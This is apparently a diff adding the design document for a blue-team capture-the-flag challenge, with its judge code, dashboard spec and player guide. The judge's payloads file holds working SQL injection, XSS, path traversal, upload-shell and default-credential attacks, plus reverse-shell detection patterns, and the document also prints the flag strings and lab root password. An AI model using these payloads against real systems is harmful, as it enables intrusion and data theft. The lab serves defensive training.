+<!-- ════════════════════ JUDGE CODE ════════════════════ -->
+<h2 id="judge-code"><span class="num">08</span> Judge Code</h2>
+
+<h3>payloads.py — Full Payload Definitions</h3>
+
+<pre><code><span class="lang-label">python</span><span class="kw">import</span> requests, paramiko, psycopg2, subprocess, random
+
+TARGET = <span class="str">"http://vulnerable-app:5000"</span>
+
+<span class="cmt"># ═══════════════════════════════════════════════════════</span>
+<span class="cmt"># Each payload returns:</span>
+<span class="cmt">#   {"id", "name", "type", "succeeded", "detail"}</span>
+<span class="cmt"># type = "malicious" | "legitimate" | "hygiene"</span>
+<span class="cmt"># ═══════════════════════════════════════════════════════</span>
+
+<span class="cmt"># ─────────── MALICIOUS ───────────</span>
+
+<span class="kw">def</span> m01_sqli_auth_bypass():
+    r = requests.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"' OR 1=1 --"</span>, <span class="str">"password"</span>: <span class="str">"x"</span>
+    }, allow_redirects=<span class="kw">False</span>)
+    bypassed = r.status_code <span class="kw">in</span> (<span class="num">302</span>, <span class="num">200</span>) <span class="kw">and</span> <span class="str">"session"</span> <span class="kw">in</span> r.cookies
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-01"</span>, <span class="str">"name"</span>: <span class="str">"SQLi Auth Bypass"</span>,
+            <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: bypassed,
+            <span class="str">"detail"</span>: <span class="str">"Login bypassed"</span> <span class="kw">if</span> bypassed <span class="kw">else</span> <span class="str">"Blocked"</span>}
+
+<span class="kw">def</span> m02_sqli_union():
+    r = requests.get(f<span class="str">"{TARGET}/search"</span>, params={
+        <span class="str">"q"</span>: <span class="str">"' UNION SELECT username,password FROM users --"</span>
+    })
+    leaked = <span class="str">"password"</span> <span class="kw">in</span> r.text.lower() <span class="kw">or</span> <span class="str">"testuser"</span> <span class="kw">in</span> r.text
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-02"</span>, <span class="str">"name"</span>: <span class="str">"SQLi UNION Extract"</span>,
+            <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: leaked,
+            <span class="str">"detail"</span>: <span class="str">"Data extracted"</span> <span class="kw">if</span> leaked <span class="kw">else</span> <span class="str">"Blocked"</span>}
+
+<span class="kw">def</span> m03_stored_xss():
+    s = requests.Session()
+    s.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>})
+    s.post(f<span class="str">"{TARGET}/profile/edit"</span>, data={
+        <span class="str">"bio"</span>: <span class="str">'&lt;script&gt;fetch("http://judge:8080/xss")&lt;/script&gt;'</span>})
+    r = s.get(f<span class="str">"{TARGET}/profile/1"</span>)
+    hit = <span class="str">"&lt;script&gt;"</span> <span class="kw">in</span> r.text
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-03"</span>, <span class="str">"name"</span>: <span class="str">"Stored XSS"</span>,
+            <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: hit,
+            <span class="str">"detail"</span>: <span class="str">"Script rendered"</span> <span class="kw">if</span> hit <span class="kw">else</span> <span class="str">"Escaped"</span>}
+
+<span class="kw">def</span> m04_reflected_xss():
+    r = requests.get(f<span class="str">"{TARGET}/search"</span>, params={
+        <span class="str">"q"</span>: <span class="str">'&lt;img src=x onerror=alert(1)&gt;'</span>})
+    hit = <span class="str">"onerror"</span> <span class="kw">in</span> r.text <span class="kw">and</span> <span class="str">"&amp;lt;"</span> <span class="kw">not in</span> r.text
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-04"</span>, <span class="str">"name"</span>: <span class="str">"Reflected XSS"</span>,
+            <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: hit,
+            <span class="str">"detail"</span>: <span class="str">"Reflected"</span> <span class="kw">if</span> hit <span class="kw">else</span> <span class="str">"Escaped"</span>}
+
+<span class="kw">def</span> m05_idor():
+    s = requests.Session()
+    s.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>})
+    r = s.get(f<span class="str">"{TARGET}/profile/2"</span>)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-05"</span>, <span class="str">"name"</span>: <span class="str">"IDOR Profile"</span>,
+            <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: r.status_code == <span class="num">200</span>,
+            <span class="str">"detail"</span>: <span class="str">"Data exposed"</span> <span class="kw">if</span> r.status_code == <span class="num">200</span> <span class="kw">else</span> <span class="str">"Denied"</span>}
+
+<span class="kw">def</span> m06_path_traversal():
+    r = requests.get(f<span class="str">"{TARGET}/uploads/../../etc/passwd"</span>)
+    hit = <span class="str">"root:"</span> <span class="kw">in</span> r.text
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-06"</span>, <span class="str">"name"</span>: <span class="str">"Path Traversal"</span>,
+            <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: hit,
+            <span class="str">"detail"</span>: <span class="str">"/etc/passwd leaked"</span> <span class="kw">if</span> hit <span class="kw">else</span> <span class="str">"Blocked"</span>}
+
+<span class="kw">def</span> m07_malicious_upload():
+    s = requests.Session()
+    s.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>})
+    s.post(f<span class="str">"{TARGET}/upload"</span>, files={
+        <span class="str">"file"</span>: (<span class="str">"shell.py"</span>, b<span class="str">"import os; os.system('id')"</span>, <span class="str">"text/x-python"</span>)})
+    r = s.get(f<span class="str">"{TARGET}/uploads/shell.py"</span>)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-07"</span>, <span class="str">"name"</span>: <span class="str">"Malicious Upload"</span>,
+            <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: r.status_code == <span class="num">200</span>,
+            <span class="str">"detail"</span>: <span class="str">"Shell accessible"</span> <span class="kw">if</span> r.status_code == <span class="num">200</span> <span class="kw">else</span> <span class="str">"Rejected"</span>}
+
+<span class="kw">def</span> m08_ssh_root():
+    <span class="kw">try</span>:
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c.connect(<span class="str">"vulnerable-app"</span>, port=<span class="num">22</span>,
+                  username=<span class="str">"root"</span>, password=<span class="str">"toor"</span>, timeout=<span class="num">5</span>)
+        c.close()
+        <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-08"</span>, <span class="str">"name"</span>: <span class="str">"SSH Root Login"</span>,
+                <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: <span class="kw">True</span>,
+                <span class="str">"detail"</span>: <span class="str">"Root shell obtained"</span>}
+    <span class="kw">except</span>:
+        <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-08"</span>, <span class="str">"name"</span>: <span class="str">"SSH Root Login"</span>,
+                <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: <span class="kw">False</span>,
+                <span class="str">"detail"</span>: <span class="str">"Access denied"</span>}
+
+<span class="kw">def</span> m09_debug_leak():
+    r = requests.get(f<span class="str">"{TARGET}/force-error-for-debug-check"</span>)
+    hit = <span class="str">"Werkzeug"</span> <span class="kw">in</span> r.text <span class="kw">or</span> <span class="str">"debugger"</span> <span class="kw">in</span> r.text.lower()
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-09"</span>, <span class="str">"name"</span>: <span class="str">"Debug Leak"</span>,
+            <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: hit,
+            <span class="str">"detail"</span>: <span class="str">"Debugger exposed"</span> <span class="kw">if</span> hit <span class="kw">else</span> <span class="str">"Hidden"</span>}
+
+<span class="kw">def</span> m10_db_default_creds():
+    <span class="kw">try</span>:
+        conn = psycopg2.connect(host=<span class="str">"vulnerable-app"</span>, port=<span class="num">5432</span>,
+            user=<span class="str">"admin"</span>, password=<span class="str">"password123"</span>,
+            dbname=<span class="str">"appdb"</span>, connect_timeout=<span class="num">5</span>)
+        conn.close()
+        <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-10"</span>, <span class="str">"name"</span>: <span class="str">"DB Default Creds"</span>,
+                <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: <span class="kw">True</span>,
+                <span class="str">"detail"</span>: <span class="str">"Connected with defaults"</span>}
+    <span class="kw">except</span>:
+        <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"M-10"</span>, <span class="str">"name"</span>: <span class="str">"DB Default Creds"</span>,
+                <span class="str">"type"</span>: <span class="str">"malicious"</span>, <span class="str">"succeeded"</span>: <span class="kw">False</span>,
+                <span class="str">"detail"</span>: <span class="str">"Creds rotated"</span>}
+
+
+<span class="cmt"># ─────────── LEGITIMATE ───────────</span>
+
+<span class="kw">def</span> l01_normal_login():
+    r = requests.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>
+    }, allow_redirects=<span class="kw">False</span>)
+    ok = r.status_code <span class="kw">in</span> (<span class="num">302</span>, <span class="num">200</span>) <span class="kw">and</span> <span class="str">"session"</span> <span class="kw">in</span> r.cookies
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-01"</span>, <span class="str">"name"</span>: <span class="str">"Normal Login"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: ok,
+            <span class="str">"detail"</span>: <span class="str">"Login OK"</span> <span class="kw">if</span> ok <span class="kw">else</span> <span class="str">"Broken"</span>}
+
+<span class="kw">def</span> l02_own_profile():
+    s = requests.Session()
+    s.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>})
+    r = s.get(f<span class="str">"{TARGET}/profile/1"</span>)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-02"</span>, <span class="str">"name"</span>: <span class="str">"Own Profile"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code == <span class="num">200</span>,
+            <span class="str">"detail"</span>: <span class="str">"Profile loaded"</span> <span class="kw">if</span> r.status_code == <span class="num">200</span> <span class="kw">else</span> <span class="str">"Broken"</span>}
+
+<span class="kw">def</span> l03_edit_bio():
+    s = requests.Session()
+    s.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>})
+    r = s.post(f<span class="str">"{TARGET}/profile/edit"</span>, data={
+        <span class="str">"bio"</span>: <span class="str">"Security enthusiast, coffee lover."</span>})
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-03"</span>, <span class="str">"name"</span>: <span class="str">"Edit Bio (Clean)"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code <span class="kw">in</span> (<span class="num">200</span>, <span class="num">302</span>),
+            <span class="str">"detail"</span>: <span class="str">"Bio saved"</span> <span class="kw">if</span> r.ok <span class="kw">else</span> <span class="str">"Failed"</span>}
+
+<span class="kw">def</span> l04_normal_search():
+    r = requests.get(f<span class="str">"{TARGET}/search"</span>, params={<span class="str">"q"</span>: <span class="str">"python tutorial"</span>})
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-04"</span>, <span class="str">"name"</span>: <span class="str">"Normal Search"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code == <span class="num">200</span>,
+            <span class="str">"detail"</span>: <span class="str">"Search OK"</span> <span class="kw">if</span> r.status_code == <span class="num">200</span> <span class="kw">else</span> <span class="str">"Broken"</span>}
+
+<span class="kw">def</span> l05_valid_upload():
+    s = requests.Session()
+    s.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>})
+    jpeg = <span class="kw">open</span>(<span class="str">"/judge/assets/legit_image.jpg"</span>, <span class="str">"rb"</span>).read()
+    r = s.post(f<span class="str">"{TARGET}/upload"</span>, files={
+        <span class="str">"file"</span>: (<span class="str">"photo.jpg"</span>, jpeg, <span class="str">"image/jpeg"</span>)})
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-05"</span>, <span class="str">"name"</span>: <span class="str">"Valid Image Upload"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code <span class="kw">in</span> (<span class="num">200</span>, <span class="num">302</span>),
+            <span class="str">"detail"</span>: <span class="str">"Accepted"</span> <span class="kw">if</span> r.ok <span class="kw">else</span> <span class="str">"Rejected"</span>}
+
+<span class="kw">def</span> l06_homepage():
+    r = requests.get(f<span class="str">"{TARGET}/"</span>)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-06"</span>, <span class="str">"name"</span>: <span class="str">"Homepage"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code == <span class="num">200</span>,
+            <span class="str">"detail"</span>: <span class="str">"Loaded"</span> <span class="kw">if</span> r.status_code == <span class="num">200</span> <span class="kw">else</span> <span class="str">"Down"</span>}
+
+<span class="kw">def</span> l07_register():
+    un = f<span class="str">"newuser_{random.randint(1000,9999)}"</span>
+    r = requests.post(f<span class="str">"{TARGET}/register"</span>, data={
+        <span class="str">"username"</span>: un, <span class="str">"email"</span>: f<span class="str">"{un}@test.com"</span>,
+        <span class="str">"password"</span>: <span class="str">"SecureP@ss1"</span>}, allow_redirects=<span class="kw">False</span>)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-07"</span>, <span class="str">"name"</span>: <span class="str">"Registration"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code <span class="kw">in</span> (<span class="num">200</span>, <span class="num">302</span>),
+            <span class="str">"detail"</span>: <span class="str">"Created"</span> <span class="kw">if</span> r.status_code <span class="kw">in</span> (<span class="num">200</span>, <span class="num">302</span>) <span class="kw">else</span> <span class="str">"Failed"</span>}
+
+<span class="kw">def</span> l08_password_change():
+    s = requests.Session()
+    s.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>})
+    r = s.post(f<span class="str">"{TARGET}/account/password"</span>, data={
+        <span class="str">"current_password"</span>: <span class="str">"testpass"</span>,
+        <span class="str">"new_password"</span>: <span class="str">"testpass"</span>})
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-08"</span>, <span class="str">"name"</span>: <span class="str">"Password Change"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code <span class="kw">in</span> (<span class="num">200</span>, <span class="num">302</span>),
+            <span class="str">"detail"</span>: <span class="str">"Updated"</span> <span class="kw">if</span> r.ok <span class="kw">else</span> <span class="str">"Failed"</span>}
+
+<span class="kw">def</span> l09_health():
+    r = requests.get(f<span class="str">"{TARGET}/api/health"</span>)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-09"</span>, <span class="str">"name"</span>: <span class="str">"Health Check"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code == <span class="num">200</span>,
+            <span class="str">"detail"</span>: <span class="str">"Healthy"</span> <span class="kw">if</span> r.status_code == <span class="num">200</span> <span class="kw">else</span> <span class="str">"Unhealthy"</span>}
+
+<span class="kw">def</span> l10_logout():
+    s = requests.Session()
+    s.post(f<span class="str">"{TARGET}/login"</span>, data={
+        <span class="str">"username"</span>: <span class="str">"testuser"</span>, <span class="str">"password"</span>: <span class="str">"testpass"</span>})
+    r = s.post(f<span class="str">"{TARGET}/logout"</span>, allow_redirects=<span class="kw">False</span>)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"L-10"</span>, <span class="str">"name"</span>: <span class="str">"Logout"</span>,
+            <span class="str">"type"</span>: <span class="str">"legitimate"</span>, <span class="str">"succeeded"</span>: r.status_code <span class="kw">in</span> (<span class="num">200</span>, <span class="num">302</span>),
+            <span class="str">"detail"</span>: <span class="str">"Logged out"</span> <span class="kw">if</span> r.status_code <span class="kw">in</span> (<span class="num">200</span>, <span class="num">302</span>) <span class="kw">else</span> <span class="str">"Failed"</span>}
+
+
+<span class="cmt"># ─────────── HYGIENE (docker exec) ───────────</span>
+
+<span class="kw">def</span> _exec(cmd):
+    r = subprocess.run([<span class="str">"docker"</span>, <span class="str">"exec"</span>, <span class="str">"vulnerable-app"</span>] + cmd,
+                       capture_output=<span class="kw">True</span>, text=<span class="kw">True</span>, timeout=<span class="num">10</span>)
+    <span class="kw">return</span> r.stdout
+
+<span class="kw">def</span> h01_rogue_uid0():
+    passwd = _exec([<span class="str">"cat"</span>, <span class="str">"/etc/passwd"</span>])
+    uid0 = [l.split(<span class="str">":"</span>)[<span class="num">0</span>] <span class="kw">for</span> l <span class="kw">in</span> passwd.splitlines()
+            <span class="kw">if</span> len(l.split(<span class="str">":"</span>)) > <span class="num">2</span> <span class="kw">and</span> l.split(<span class="str">":"</span>)[<span class="num">2</span>] == <span class="str">"0"</span>]
+    clean = uid0 == [<span class="str">"root"</span>]
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"H-01"</span>, <span class="str">"name"</span>: <span class="str">"Rogue UID-0"</span>,
+            <span class="str">"type"</span>: <span class="str">"hygiene"</span>, <span class="str">"succeeded"</span>: clean,
+            <span class="str">"detail"</span>: <span class="str">"Only root"</span> <span class="kw">if</span> clean <span class="kw">else</span> f<span class="str">"UID-0: {uid0}"</span>}
+
+<span class="kw">def</span> h02_malicious_cron():
+    cron = _exec([<span class="str">"cat"</span>, <span class="str">"/etc/cron.d/system-update"</span>])
+    clean = <span class="str">"curl"</span> <span class="kw">not in</span> cron <span class="kw">and</span> <span class="str">"wget"</span> <span class="kw">not in</span> cron
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"H-02"</span>, <span class="str">"name"</span>: <span class="str">"Malicious Cron"</span>,
+            <span class="str">"type"</span>: <span class="str">"hygiene"</span>, <span class="str">"succeeded"</span>: clean,
+            <span class="str">"detail"</span>: <span class="str">"Clean"</span> <span class="kw">if</span> clean <span class="kw">else</span> <span class="str">"Suspicious cron"</span>}
+
+<span class="kw">def</span> h03_entrypoint_backdoor():
+    entry = _exec([<span class="str">"cat"</span>, <span class="str">"/app/entrypoint.sh"</span>])
+    patterns = [<span class="str">"/dev/tcp"</span>, <span class="str">"bash -i"</span>, <span class="str">"nc -e"</span>, <span class="str">"mkfifo"</span>]
+    clean = <span class="kw">not</span> any(p <span class="kw">in</span> entry <span class="kw">for</span> p <span class="kw">in</span> patterns)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"H-03"</span>, <span class="str">"name"</span>: <span class="str">"Entrypoint Backdoor"</span>,
+            <span class="str">"type"</span>: <span class="str">"hygiene"</span>, <span class="str">"succeeded"</span>: clean,
+            <span class="str">"detail"</span>: <span class="str">"Clean"</span> <span class="kw">if</span> clean <span class="kw">else</span> <span class="str">"Backdoor found"</span>}
+
+<span class="kw">def</span> h04_suid_find():
+    perms = _exec([<span class="str">"stat"</span>, <span class="str">"-c"</span>, <span class="str">"%a"</span>, <span class="str">"/usr/bin/find"</span>]).strip()
+    clean = <span class="kw">not</span> perms.startswith(<span class="str">"4"</span>)
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"H-04"</span>, <span class="str">"name"</span>: <span class="str">"SUID find"</span>,
+            <span class="str">"type"</span>: <span class="str">"hygiene"</span>, <span class="str">"succeeded"</span>: clean,
+            <span class="str">"detail"</span>: <span class="str">"SUID removed"</span> <span class="kw">if</span> clean <span class="kw">else</span> <span class="str">"SUID set"</span>}
+
+<span class="kw">def</span> h05_attack_tools():
+    nmap = _exec([<span class="str">"which"</span>, <span class="str">"nmap"</span>]).strip()
+    nc = _exec([<span class="str">"which"</span>, <span class="str">"nc"</span>]).strip()
+    clean = <span class="kw">not</span> nmap <span class="kw">and not</span> nc
+    <span class="kw">return</span> {<span class="str">"id"</span>: <span class="str">"H-05"</span>, <span class="str">"name"</span>: <span class="str">"Attack Tools"</span>,
+            <span class="str">"type"</span>: <span class="str">"hygiene"</span>, <span class="str">"succeeded"</span>: clean,
+            <span class="str">"detail"</span>: <span class="str">"Removed"</span> <span class="kw">if</span> clean <span class="kw">else</span> <span class="str">"Still installed"</span>}
+
+
+<span class="cmt"># ─────────── REGISTRY ───────────</span>
+
+ALL_PAYLOADS = [
+    m01_sqli_auth_bypass, m02_sqli_union, m03_stored_xss, m04_reflected_xss,
+    m05_idor, m06_path_traversal, m07_malicious_upload, m08_ssh_root,
+    m09_debug_leak, m10_db_default_creds,
+    l01_normal_login, l02_own_profile, l03_edit_bio, l04_normal_search,
+    l05_valid_upload, l06_homepage, l07_register, l08_password_change,
+    l09_health, l10_logout,
+]
+
+HYGIENE_CHECKS = [
+    h01_rogue_uid0, h02_malicious_cron, h03_entrypoint_backdoor,
+    h04_suid_find, h05_attack_tools,
+]</code></pre>
+
+<h3>barrage.py — Payload Engine</h3>
+
+<pre><code><span class="lang-label">python</span><span class="kw">import</span> random, time
+<span class="kw">from</span> payloads <span class="kw">import</span> ALL_PAYLOADS, HYGIENE_CHECKS
+
+FLAG_THRESHOLDS = [
+    (<span class="num">1</span>,  <span class="str">"FLAG{f1r5t_bl00d_d3f3nd3r}"</span>),
+    (<span class="num">3</span>,  <span class="str">"FLAG{g3tt1ng_th3_h4ng_0f_1t}"</span>),
+    (<span class="num">6</span>,  <span class="str">"FLAG{bl03_t34m_v3t3r4n}"</span>),
+    (<span class="num">10</span>, <span class="str">"FLAG{f0rtr3ss_m0d3_4ct1v4t3d}"</span>),
+]
+
+<span class="kw">def</span> run_barrage():
+    <span class="cmt"># 1. Hygiene checks (docker exec)</span>
+    hygiene_results = []
+    <span class="kw">for</span> check <span class="kw">in</span> HYGIENE_CHECKS:
+        <span class="kw">try</span>:
+            hygiene_results.append(check())
+        <span class="kw">except</span> Exception <span class="kw">as</span> e:
+            hygiene_results.append({
+                <span class="str">"id"</span>: check.__name__, <span class="str">"name"</span>: check.__name__,
+                <span class="str">"type"</span>: <span class="str">"hygiene"</span>, <span class="str">"succeeded"</span>: <span class="kw">False</span>,
+                <span class="str">"detail"</span>: f<span class="str">"Error: {e}"</span>})
+
+    <span class="cmt"># 2. Shuffle and fire network payloads</span>
+    shuffled = ALL_PAYLOADS[:]
+    random.shuffle(shuffled)
+
+    payload_results = []
+    <span class="kw">for</span> fn <span class="kw">in</span> shuffled:
+        <span class="kw">try</span>:
+            result = fn()
+        <span class="kw">except</span> Exception <span class="kw">as</span> e:
+            result = {<span class="str">"id"</span>: fn.__name__, <span class="str">"name"</span>: fn.__name__,
+                      <span class="str">"type"</span>: <span class="str">"unknown"</span>, <span class="str">"succeeded"</span>: <span class="kw">False</span>,
+                      <span class="str">"detail"</span>: f<span class="str">"Error: {e}"</span>}
+        payload_results.append(result)
+        time.sleep(random.uniform(<span class="num">0.1</span>, <span class="num">0.5</span>))  <span class="cmt"># jitter</span>
+
+    <span class="cmt"># 3. Score</span>
+    legit_ok = sum(<span class="num">1</span> <span class="kw">for</span> r <span class="kw">in</span> payload_results
+                   <span class="kw">if</span> r[<span class="str">"type"</span>] == <span class="str">"legitimate"</span> <span class="kw">and</span> r[<span class="str">"succeeded"</span>])
+    mal_ok = sum(<span class="num">1</span> <span class="kw">for</span> r <span class="kw">in</span> payload_results
+                 <span class="kw">if</span> r[<span class="str">"type"</span>] == <span class="str">"malicious"</span> <span class="kw">and</span> r[<span class="str">"succeeded"</span>])
+    hyg_ok = sum(<span class="num">1</span> <span class="kw">for</span> r <span class="kw">in</span> hygiene_results <span class="kw">if</span> r[<span class="str">"succeeded"</span>])
+
+    score = legit_ok - mal_ok + hyg_ok
+    flags = [f <span class="kw">for</span> t, f <span class="kw">in</span> FLAG_THRESHOLDS <span class="kw">if</span> score >= t]
+
+    <span class="kw">return</span> {
+        <span class="str">"score"</span>: score,
+        <span class="str">"breakdown"</span>: {
+            <span class="str">"legit_passed"</span>: legit_ok, <span class="str">"legit_total"</span>: <span class="num">10</span>,
+            <span class="str">"malicious_passed"</span>: mal_ok, <span class="str">"malicious_total"</span>: <span class="num">10</span>,
+            <span class="str">"hygiene_passed"</span>: hyg_ok, <span class="str">"hygiene_total"</span>: <span class="num">5</span>,
+        },
+        <span class="str">"flags"</span>: flags,
+        <span class="str">"payload_results"</span>: payload_results,
+        <span class="str">"hygiene_results"</span>: hygiene_results,
+    }</code></pre>
+
+<h3>server.py — Dashboard API</h3>
+
+<pre><code><span class="lang-label">python</span><span class="kw">from</span> flask <span class="kw">import</span> Flask, jsonify, render_template
+<span class="kw">from</span> barrage <span class="kw">import</span> run_barrage
+
+app = Flask(__name__)
+latest_run = <span class="kw">None</span>
+
+<span class="kw">@app.route</span>(<span class="str">"/"</span>)
+<span class="kw">def</span> dashboard():
+    <span class="kw">return</span> render_template(<span class="str">"dashboard.html"</span>, run=latest_run)
+
+<span class="kw">@app.route</span>(<span class="str">"/api/launch"</span>, methods=[<span class="str">"POST"</span>])
+<span class="kw">def</span> launch():
+    <span class="cmt">"""Player presses the button — fire everything."""</span>
+    <span class="kw">global</span> latest_run
+    latest_run = run_barrage()
+    <span class="kw">return</span> jsonify(latest_run)
+
+<span class="kw">@app.route</span>(<span class="str">"/api/results"</span>)
+<span class="kw">def</span> results():
+    <span class="kw">if not</span> latest_run:
+        <span class="kw">return</span> jsonify({<span class="str">"error"</span>: <span class="str">"No barrage yet"</span>}), <span class="num">404</span>
+    <span class="kw">return</span> jsonify(latest_run)
+
+<span class="kw">if</span> __name__ == <span class="str">"__main__"</span>:
+    app.run(host=<span class="str">"0.0.0.0"</span>, port=<span class="num">8080</span>)</code></pre>
+
+
+<!-- ════════════════════ DASHBOARD ════════════════════ -->
+<h2 id="dashboard"><span class="num">09</span> Dashboard UI Spec</h2>
+
+<p><strong>Before any barrage:</strong> Welcome text with rules and a large "Launch Payload Barrage" button. No scores, no flags, no results.</p>
+
+<p><strong>During barrage</strong> (~10-15s): Live feed showing payloads firing with anonymized labels ("Payload 01", "Payload 02"…). No types revealed. A progress bar fills as payloads complete.</p>
+
+<p><strong>After barrage:</strong> A dramatic reveal sequence plays — each payload's type flips from <code>???</code> to <span style="color:var(--red)">MALICIOUS</span> or <span style="color:var(--green)">LEGITIMATE</span>. The score counts up. Flag thresholds are shown as a progress track with locks that animate open as thresholds are met. Unlocked flags display in full. A detailed results table shows every payload with its outcome.</p>
+
+<p><strong>Re-run:</strong> The button stays available. Each press clears previous results and runs a fresh barrage. Only the latest run matters.</p>
+
+<div class="callout success">
+  <div class="callout-label">UX Detail — The Reveal</div>
+  The type reveal is the core dramatic moment. During the barrage, results stream in anonymized. After all 20 complete, a 3-second countdown begins. Then each row flips its type label one by one (150ms stagger), coloring red or green. Succeeded malicious payloads pulse red. The score counter animates from 0 to final value. This makes the "did my fix work?" moment visceral and memorable.
+</div>
+
+
+<!-- ════════════════════ PLAYER GUIDE ════════════════════ -->
+<h2 id="player"><span class="num">10</span> Player Guide</h2>
+
+<div class="callout info">
+  <div class="callout-label">Quick Start</div>
+  <p style="margin-bottom:0.5rem;"><strong>1.</strong> SSH in: <code>ssh root@localhost -p 2222</code> (password: <code>toor</code>)</p>
+  <p style="margin-bottom:0.5rem;"><strong>2.</strong> Open dashboard: <code>http://localhost:8080</code></p>
+  <p style="margin-bottom:0.5rem;"><strong>3.</strong> Investigate the app — code, config, users, services, cron, filesystem</p>
+  <p style="margin-bottom:0.5rem;"><strong>4.</strong> Fix what you find. Keep the app working.</p>
+  <p style="margin-bottom:0.5rem;"><strong>5.</strong> Hit "Launch Payload Barrage" to test your fixes</p>
+  <p style="margin-bottom:0.5rem;"><strong>6.</strong> Review results → fix more → barrage again</p>
+  <p style="margin-bottom:0;"><strong>7.</strong> Collect all 4 flags. You have <strong>2 hours</strong>.</p>
+</div>
+
+<div class="callout warn">
+  <div class="callout-label">The Core Tension</div>
+  The barrage includes legitimate traffic that must succeed. If you break normal functionality while fixing security issues — overly aggressive input filtering, disabling endpoints, killing services — those legitimate payloads will fail and <strong>cost you points</strong>. Real defense means blocking attacks <em>without</em> breaking the app. That's the skill being tested.
+</div>
+
+<hr class="divider">
+
+<p class="footer">SecureBox v2.0 — Mixed-payload blue team challenge<br>Manual barrage trigger · Threshold-based flags · Log obfuscation by design</p>
+
+</body>
+</html>
